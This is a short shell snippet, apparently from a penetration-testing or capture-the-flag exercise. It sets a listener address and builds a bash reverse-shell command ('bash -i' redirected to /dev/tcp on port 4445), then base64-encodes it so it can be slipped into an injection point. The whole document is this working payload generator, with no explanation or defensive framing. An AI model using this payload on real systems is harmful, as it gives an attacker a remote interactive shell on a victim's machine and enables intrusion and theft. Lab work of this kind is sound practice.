LHOST=10.10.14.X
B64=$(echo -n "bash -i >& /dev/tcp/$LHOST/4445 0>&1" | base64 -w0)
echo $B64
